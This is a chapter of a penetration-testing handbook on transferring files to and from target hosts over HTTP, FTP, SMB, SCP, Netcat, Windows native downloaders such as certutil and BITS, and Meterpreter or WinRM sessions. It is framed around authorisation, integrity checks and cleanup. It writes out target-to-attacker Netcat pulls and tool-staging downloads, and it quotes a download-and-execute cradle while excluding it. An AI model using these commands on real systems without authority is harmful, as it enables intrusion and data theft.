# 09 · File transfers

Move an **authorised, known artifact** from a named source to a named destination — and prove it
arrived intact. The loop: `authority + exact artifact → classify/minimise → record source
host/path/owner → record dest host/path/owner → draw the direction and initiator → prove route/client/
protocol → stand up a dedicated least-exposed server/share/session → choose auth/TLS/proxy/overwrite/
partial policy → transfer once → verify byte count + digest at both ends → hand off without
auto-execution → stop all transfer state → retain/delete under the named owner.`

**Transfer and execution are separate authorisations** — §09 ends at *verified custody*. A reachable
URL/share/shell/credential does not authorise serving, downloading, collecting, or executing. There is
no "one method that always works": select by reachability, installed client, protocol, policy, size,
and integrity evidence.

**Routes:** web upload consumer/vuln → [§02](02-web-attacks.md); payload/shell/**execution** →
[§03](03-shells-and-payloads.md); passwords → [§04](04-password-attacks.md); privilege/artifact
**acquisition** → [§05](05-linux-privesc.md)/[§06](06-windows-privesc.md); route/tunnel/relay topology →
[§07](07-pivoting-and-tunneling.md); AD/lateral session → [§08](08-active-directory.md); post-access
collection/analysis → [§10](10-post-exploitation-and-loot.md). **Excluded:** download-and-execute,
"fileless"/hidden/trusted-binary/AV-IDS-evasion framing, broad "loot" exfiltration, and credentials in
URLs/history.

Placeholders: `SERVER_IP`/`SERVER_PORT` (a server you own), `SOURCE_PATH`, `DEST_PATH`, `SERVER_BIND`,
`EXPECTED_CLIENT`, `USERNAME`, `CREDENTIAL_HANDLE`, `EXPECTED_BYTES`, `EXPECTED_SHA256`, `TIME_BUDGET`,
`DATA_CLASS`, `RETENTION_OWNER`. Tool/alias/version/policy/dialect behaviour (PowerShell aliases, SMB
signing, FTPS, curl/wget, Netcat flags, certutil/BITS) is **version-volatile** — mark categorical
claims `HOLD` until verified against the installed build.

**Jump:** [controller](#91-transfer-controller-and-authority) · [manifest/preflight](#92-artifact-manifest-and-destination-preflight) ·
[method choice](#93-method-selection-and-fallback) · [HTTP serving](#94-temporary-http-serving) ·
[Linux HTTP clients](#95-linux-http-clients) · [redirects/TLS/proxy](#96-http-redirects-tls-auth-and-proxies) ·
[retry/resume](#97-retry-timeout-ranges-and-resume) · [FTP](#98-ftp-controller) · [SMB](#99-smb-serving-and-retrieval) ·
[SCP/SFTP](#910-scp-and-sftp) · [Windows native](#911-windows-native-downloads) ·
[session-native](#912-session-native-transfers) · [Netcat](#913-raw-netcat-streams) ·
[base64](#914-base64-and-clipboard-last-resort) · [archives](#915-archives-and-multi-file-sets) ·
[returning results](#916-returning-authorised-results) · [pivot](#917-transfer-through-a-pivot) ·
[validation](#918-validation-and-failure-controller) · [owner handoffs](#919-owner-handoffs) ·
[cleanup](#920-cleanup-and-closeout).

## 9.1 Transfer controller and authority

Before any server/client, record: the exact need and artifact owner; the **direction** (who invokes the
client, who serves/listens); the classification/minimisation of the data; the time window; and STOP
conditions. A reachable endpoint is not authority. Any missing owner/classification/source/destination/
direction/integrity/cleanup owner is a **STOP/HOLD**, not a guess.

## 9.2 Artifact manifest and destination preflight

Every artifact carries a manifest; every destination gets a preflight.

```text
Manifest:  logical name · provenance/version · type (and OS/arch/runtime if executable) ·
           EXPECTED_BYTES · EXPECTED_SHA256 · owner · classification
Dest preflight: parent dir exists · free space · owner/mode/ACL · filename/collision ·
           overwrite policy (fail / rename-quarantine / verified-resume — never silent) · final perms
```

Compute the digest at the source **before** transfer so you have something to verify against
([§9.18](#918-validation-and-failure-controller)). A destination collision policy must be explicit; a
partial/interrupted file is quarantined, not left in place.

## 9.3 Method selection and fallback

Pick by evidence, not habit — there is no universal method.

| If… | Prefer | Section |
|---|---|---|
| target has HTTP egress + `wget`/`curl` | HTTP pull | [§9.5](#95-linux-http-clients) |
| Windows target, HTTP egress | native downloader (version-held) | [§9.11](#911-windows-native-downloads) |
| SMB reachable (esp. Windows) | dedicated SMB share | [§9.9](#99-smb-serving-and-retrieval) |
| you have SSH to/from the host | SCP/SFTP | [§9.10](#910-scp-and-sftp) |
| you hold a WinRM/framework session | session-native put/get | [§9.12](#912-session-native-transfers) |
| only a raw TCP path | Netcat stream | [§9.13](#913-raw-netcat-streams) |
| tiny artifact, terminal only | base64 paste | [§9.14](#914-base64-and-clipboard-last-resort) |
| through a pivot | §07 endpoint + relay | [§9.17](#917-transfer-through-a-pivot) |

**Correction:** "one method per direction that always works" encourages blind fallback — on failure,
identify the category first ([§9.18](#918-validation-and-failure-controller)), then change one variable.

## 9.4 Temporary HTTP serving

Serve a **dedicated minimal directory**, bound deliberately, for a finite window — never the current
working directory.

```bash
mkdir /srv/stage && cp SOURCE_PATH /srv/stage/     # dedicated root with only the intended artifact
cd /srv/stage && python3 -m http.server SERVER_PORT --bind SERVER_BIND   # note the access log; stop with Ctrl-C
# conditional alternative (dev server, not hardened):
php -S SERVER_BIND:SERVER_PORT -t /srv/stage
```

**Corrections:** `python3 -m http.server` defaults to **all interfaces** — bind to your VPN/tunnel
interface, and treat `0.0.0.0` as a visible exposure decision. Python 2's `SimpleHTTPServer` is legacy,
not a default. Record bind/interface, the chosen port (ownership/conflict; <1024 needs privilege), the
`EXPECTED_CLIENT`, a time-box, and the access log. Stop the server and remove the staging root in
cleanup ([§9.20](#920-cleanup-and-closeout)).

## 9.5 Linux HTTP clients

`wget` and `curl` are **not** interchangeable — name the local output explicitly and validate the bytes.

```bash
wget http://SERVER_IP:SERVER_PORT/tool -O DEST_PATH        # explicit output path; -O avoids odd auto-naming
curl -fsS http://SERVER_IP:SERVER_PORT/tool -o DEST_PATH    # -f fails on HTTP error (else you save the error body)
sha256sum DEST_PATH                                          # compare to EXPECTED_SHA256
```

**Corrections:** without `-f`, `curl` saves a 4xx/5xx error body **as** your file — always check status.
`wget -O` / `curl -o` set an explicit local name (vs `curl -O` remote-name mode, which needs collision/
sanitisation care). A downloaded file's **presence is not success** — verify `EXPECTED_BYTES` +
`EXPECTED_SHA256`. `/dev/tcp` is **not** a general downloader — it is Bash-runtime-specific raw I/O; use
a Netcat stream ([§9.13](#913-raw-netcat-streams)) or route the shell primitive to
[§03](03-shells-and-payloads.md).

## 9.6 HTTP redirects, TLS, auth, and proxies

Each is a separate decision — inspect before following.

```bash
curl -fsSL -o DEST_PATH https://SERVER_IP/tool         # -L follows redirects; review each hop
curl -fsS --cacert ca.pem -o DEST_PATH https://host/tool   # verify TLS by default
curl -fsS -x http://PROXY_HOST:PORT -o DEST_PATH http://host/tool   # proxy route owned by §07
```

**Corrections:** a redirect can change host/scheme/method/cookies/credentials — a Basic/Bearer header or
cookie may be forwarded to a new host; review each hop. TLS verification is the **default**; `-k`/
`--insecure` removes authenticity and is an explicit exception with a hostname/fingerprint compensation,
never a convenience. A `HEAD` success does not prove `GET`/body/range will succeed. Proxy topology/DNS is
[§07](07-pivoting-and-tunneling.md); protect proxy creds/auth headers/cookie jars (sensitive artifacts —
set owner/mode, then delete). Credential acquisition routes to [§04](04-password-attacks.md); §09 uses a
`CREDENTIAL_HANDLE`, never a value in the URL/history.

## 9.7 Retry, timeout, ranges, and resume

An interrupted transfer is **UNKNOWN**, not automatically failed — reconcile bytes before retrying.

```bash
curl -fsS --connect-timeout 10 --max-time TIME_BUDGET -o DEST_PATH http://host/tool
curl -fsS -C - -o DEST_PATH http://host/tool           # resume — only if the server supports ranges
```

**Corrections:** a timeout may have already sent bytes — for a **non-idempotent upload**, a blind retry
can duplicate the action; confirm the remote state first. Before a resume (`-C -`), verify the server
supports byte ranges **and** that the local partial matches the same source (size/identity); otherwise
quarantine the partial and restart. Finish any resumed transfer with a full `EXPECTED_BYTES` +
`EXPECTED_SHA256` check. Retry **one** variable at a time and stop on the first validated success.

## 9.8 FTP controller

FTP uses a **separate control and data channel** — a successful login is not a successful transfer.
Default arbitrary bytes to **binary**.

```bash
ftp SERVER_IP                          # login on the control channel (port 21)
ftp> binary                            # TYPE I — the safe default for arbitrary bytes
ftp> passive                           # usually needed through NAT/firewall
ftp> ls                                # confirm remote name; note local vs remote cwd (lcd/cd)
ftp> get REMOTE_NAME DEST_PATH
ftp> bye
```

**Corrections:** **active** mode = the *server* initiates the data channel from its port 20 to a
client-advertised endpoint (NAT/firewall often blocks it); **passive** = the *server* advertises a high
port and the *client* initiates the data channel (usually works through NAT). **ASCII mode transforms
line endings** — using it on a binary artifact corrupts bytes (the classic `WARNING! N bare linefeeds
received in ASCII mode` is evidence the data changed); only use `ascii` for genuine text you intend to
translate. Validate the local output size/digest — the client's "Transfer complete" is not proof. For
recursive URL retrieval, remove embedded credentials and bound the path/recursion/symlinks/size:
```bash
wget -r --level=1 ftp://USERNAME@SERVER_IP:PORT/SOURCE_PATH/    # credential via prompt/handle, not inline
```
FTPS/client behaviour is a version `HOLD`.

## 9.9 SMB serving and retrieval

Serve a **dedicated minimal share root** with scoped authentication; never share `.`/a broad working
directory.

```bash
mkdir /srv/smbstage && cp SOURCE_PATH /srv/smbstage/
impacket-smbserver share /srv/smbstage -smb2support -user USERNAME -password CREDENTIAL_HANDLE
```
```powershell
# on the Windows target — authenticated map, then copy, then disconnect:
net use \\SERVER_IP\share /user:USERNAME CREDENTIAL_HANDLE
copy \\SERVER_IP\share\tool C:\Windows\Temp\tool
net use \\SERVER_IP\share /delete
```

**Corrections:** modern Windows clients often refuse **guest/unauthenticated** SMB and require signing —
this is policy/dialect/version dependent (`HOLD`), so prefer explicit scoped auth and verify behaviour
rather than claiming "Win10/11 guest". Distinguish the **share permission** from the destination
**filesystem/NTFS permission**. Replace sample credentials with a handle; avoid exposing them in
command-line/history/logs. Stop the server, remove the share root, and `net use /delete` in cleanup.

## 9.10 SCP and SFTP

Always draw the **invoking host and direction** — SCP paths expand on the side that runs the command.

```bash
# PUSH  (you → target):  run on YOUR box
scp SOURCE_PATH USERNAME@DEST_HOST:/tmp/tool
# PULL  (target → you):  run on YOUR box
scp USERNAME@SOURCE_HOST:/remote/tool DEST_PATH
sftp USERNAME@DEST_HOST                 # interactive put/get with the same direction rules
```

**Corrections:** decide the **SSH host-key** policy deliberately (a first-connection prompt is a trust
decision — don't blanket-disable checking). Handle the key/agent/password as a custody item
([§04](04-password-attacks.md) owns credentials); set the destination file's final owner/mode. Validate
the transferred bytes/digest at the destination like any other method.

## 9.11 Windows native downloads

Distinct executables/runtimes with distinct behaviour — treat each as a version `HOLD` and verify the
destination independently of any progress output.

```powershell
# .NET WebClient (PS/.NET version-dependent):
powershell -c "(New-Object Net.WebClient).DownloadFile('http://SERVER_IP/tool','C:\Windows\Temp\tool')"
# Invoke-WebRequest (PowerShell edition/alias-dependent; explicit -OutFile):
powershell -c "Invoke-WebRequest http://SERVER_IP/tool -OutFile C:\Windows\Temp\tool"
# certutil LOLBin (OS/build-dependent; leaves a URL cache):
certutil -urlcache -split -f http://SERVER_IP/tool C:\Windows\Temp\tool
# BITS — an ASYNCHRONOUS job, not a one-liner (name it; check state; clean up):
bitsadmin /transfer j /download /priority normal http://SERVER_IP/tool C:\Windows\Temp\tool
Get-FileHash C:\Windows\Temp\tool -Algorithm SHA256      # compare to EXPECTED_SHA256
```

**Corrections:** `curl`/`iwr`/`wget` in PowerShell may be **aliases** for `Invoke-WebRequest`, not the
native `curl.exe` — identify the exact executable and remove any insecure/aggressive alias defaults.
certutil leaves a URL cache (clean it); BITS is an async job with a lifecycle (job name/state/completion/
cancel) — a process exit is not proof. **Excluded:** `IEX(New-Object Net.WebClient).DownloadString(...)`
download-and-execute and any "fileless/hidden/dodges AV" framing — §09 describes **text retrieval to
disk** only; execution is [§03](03-shells-and-payloads.md).

## 9.12 Session-native transfers

When you already hold an authenticated session, use its own put/get — the session owner is
[§08](08-active-directory.md)/[§10](10-post-exploitation-and-loot.md) (or [§03](03-shells-and-payloads.md)
for a framework session); §09 keeps the artifact contract.

```text
Evil-WinRM:   upload LOCAL_PATH C:\dest\tool   /   download C:\src\tool LOCAL_PATH
Meterpreter:  upload LOCAL_PATH C:\dest\tool   /   download C:\src\tool LOCAL_PATH
```

State the authenticated identity, the remote cwd/absolute path, and the direction. **Correction:** a
progress bar is transport progress, **not** final integrity — verify `EXPECTED_BYTES` +
`EXPECTED_SHA256` (`Get-FileHash`) at the destination. Session teardown/credential handling stays with
the session's owning chapter.

## 9.13 Raw Netcat streams

A raw **unframed** stream: one listener, one initiator, agreed address/port — and completion is proven
by bytes/digest, not by the socket closing. Split push and pull.

```bash
# PULL to you (target → you):
#   you:     nc -lvnp SERVER_PORT > DEST_PATH
#   target:  nc -w3 SERVER_IP SERVER_PORT < SOURCE_PATH
# PUSH to target (you → target):
#   target:  nc -lvnp SERVER_PORT > DEST_PATH
#   you:     nc -w3 TARGET_HOST SERVER_PORT < SOURCE_PATH
```

**Corrections:** Netcat flags vary by implementation (`nc`/OpenBSD/traditional/Ncat/BusyBox) — a `HOLD`;
some builds need an explicit idle timeout (`-w`) or the receiver never returns. There is **no framing/
EOF integrity** — after the stream, compare `EXPECTED_BYTES` and `sha256sum`/`Get-FileHash` at **both**
ends; on a reset/timeout, quarantine the partial before retrying. Do not turn this into a shell/payload
card — that is [§03](03-shells-and-payloads.md).

## 9.14 Base64 and clipboard (last resort)

For a **tiny** artifact when only a terminal is available — base64 is **representation**, not encryption,
integrity, or a filter/AV bypass.

```bash
base64 -w0 SOURCE_PATH        # single line; paste into the target terminal
# on the target:
echo '<b64>' | base64 -d > DEST_PATH
sha256sum DEST_PATH           # must match the source digest
```

**Corrections:** base64 **expands** data ~33% and may **wrap/newline-split or truncate** in transit
(`-w0` avoids wrapping; watch terminal line limits) — a corrupted paste yields a wrong file. It provides
**no confidentiality or integrity**, so the exact decode path plus a source/destination digest round-trip
is mandatory. Not suitable for large or binary-heavy artifacts.

## 9.15 Archives and multi-file sets

Creation, transfer, and extraction are **three separate** states — validate at each boundary.

```bash
tar -czf /srv/stage/set.tgz -C SOURCE_PATH .    # create: exact dataset only
sha256sum /srv/stage/set.tgz                      # digest before transfer
# … transfer via a method above, verify the archive digest at the destination …
mkdir /dest/out && tar -xzf set.tgz -C /dest/out  # extract into a dedicated dir
```

**Corrections:** check the extractor/format/version at the destination; guard against **path traversal**
(`../`), **symlinks**, filename **collisions**, and unexpected **permissions** on extraction (extract into
a dedicated directory, not over existing files). An archive round-trip does not necessarily preserve
original owner/mode/ACL — restore those only when required and authorised. The digest you verify is the
**archive's**; re-verify individual files if their integrity matters.

## 9.16 Returning authorised results

Bringing a result **back** is an authorised return, not a default "grab everything". The data owner
approves the exact artifact first.

```text
Before returning: DATA_CLASS · minimisation (exact files, nothing extra) · local custody path/owner ·
                  RETENTION_OWNER · encryption-at-rest/access if sensitive · explicit transfer method
```

Use any method above with the direction reversed (target → you). **Corrections:** replace default
`SAM`/`SYSTEM`/hashes/config "loot" examples with a neutral, **approved** artifact — sensitive
system/domain material must be classified, minimised, and authorised by its owner
([§05](05-linux-privesc.md)/[§06](06-windows-privesc.md)/[§08](08-active-directory.md)/[§10](10-post-exploitation-and-loot.md))
**before** §09 describes transport. Never make broad exfiltration a checklist item.

## 9.17 Transfer through a pivot

Accept a pivot endpoint **only** from a proven [§07](07-pivoting-and-tunneling.md) topology — do not
invent a "pivot IP" or assume one relay fits every protocol.

```text
CLIENT → PIVOT_INGRESS:relay_port → PIVOT_EGRESS → SERVER (per §07's proven map)
```

Point the transfer at the **relayed listener/port** §07 established (not your box directly), and record
each hop's bind/exposure/process/cleanup. **Correction:** each hop reporting "progress" is not end-to-end
integrity — verify `EXPECTED_BYTES` + `EXPECTED_SHA256` at the true destination. SMB/SCP/HTTP through a
forward keep their own auth/dialect/validation here; the forwarding topology stays in §07.

## 9.18 Validation and failure controller

Presence, HTTP `200`, a progress bar, a socket close, or a client exit code alone is **not** success.

```bash
# both ends:
stat -c %s DEST_PATH        # == EXPECTED_BYTES ?
sha256sum DEST_PATH         # == EXPECTED_SHA256 ?   (Get-FileHash on Windows)
```

If no digest is available, record an explicit weaker size/type/content sanity check **and its limit**.
Failure taxonomy → check in order: server not bound / wrong interface; route/firewall/proxy; auth/TLS;
redirect changed host/method; **timeout = UNKNOWN** (reconcile remote bytes before retry); collision/
overwrite; partial/range mismatch; wrong encoding; content mismatch. Quarantine partials, change **one**
variable, and stop on the first validated success.

## 9.19 Owner handoffs

§09 stops at **verified custody** and routes the next action to its owner:

| Next action | Owner |
|---|---|
| generate the artifact / provenance | source chapter ([§03](03-shells-and-payloads.md) payloads, tool upstream) |
| a web upload consumer / vulnerability | [§02](02-web-attacks.md) |
| execute the transferred file | [§03](03-shells-and-payloads.md) |
| credential handling | [§04](04-password-attacks.md) |
| privilege/acquisition trigger | [§05](05-linux-privesc.md)/[§06](06-windows-privesc.md) |
| pivot/relay topology | [§07](07-pivoting-and-tunneling.md) |
| AD/lateral session | [§08](08-active-directory.md) |
| collection/analysis/reporting | [§10](10-post-exploitation-and-loot.md) |

Custody of an executable does not authorise executing it; a returned result does not authorise analysis
or reuse — each is a fresh scope gate.

## 9.20 Cleanup and closeout

Close every branch — success, negative, or aborted:

```text
- servers/shares/relays: stop the HTTP/PHP/SMB/FTP server and pivot relay; release ports (ss -tlnp)
- jobs/sessions: cancel BITS jobs; disconnect `net use`; close session transfers
- staging: delete the dedicated staging/share root and any downloaded copy no longer needed
- partials: quarantine or delete interrupted files (never leave a partial executable in place)
- secrets: remove credential artifacts, cookie jars, keys/PFX, and URL caches (certutil)
- logs/history: protect/remove access logs, verbose traces, and shell history exposing secrets/URLs
- final artifact: retain or delete under RETENTION_OWNER
```

Verify the transfer left no server/share/job/session/partial/credential behind, then hand off with fresh
scope.

## References

- Tool/alias/policy behaviour drifts — `wget`/`curl`(.exe) vs PowerShell aliases, `Invoke-WebRequest`/
  `WebClient`, certutil/BITS availability, SMB signing/dialect/guest policy, FTPS, and Netcat flags are
  version/edition/OS holds; verify against the installed build before relying on a categorical claim.
- Prefer SHA-256 (or a stronger current digest) as primary integrity evidence over MD5; label any weaker
  check and its limitation.
- Chapter handoffs are linked inline: web [§02](02-web-attacks.md), shells [§03](03-shells-and-payloads.md),
  passwords [§04](04-password-attacks.md), Linux [§05](05-linux-privesc.md), Windows
  [§06](06-windows-privesc.md), pivoting [§07](07-pivoting-and-tunneling.md), Active Directory
  [§08](08-active-directory.md), loot [§10](10-post-exploitation-and-loot.md).
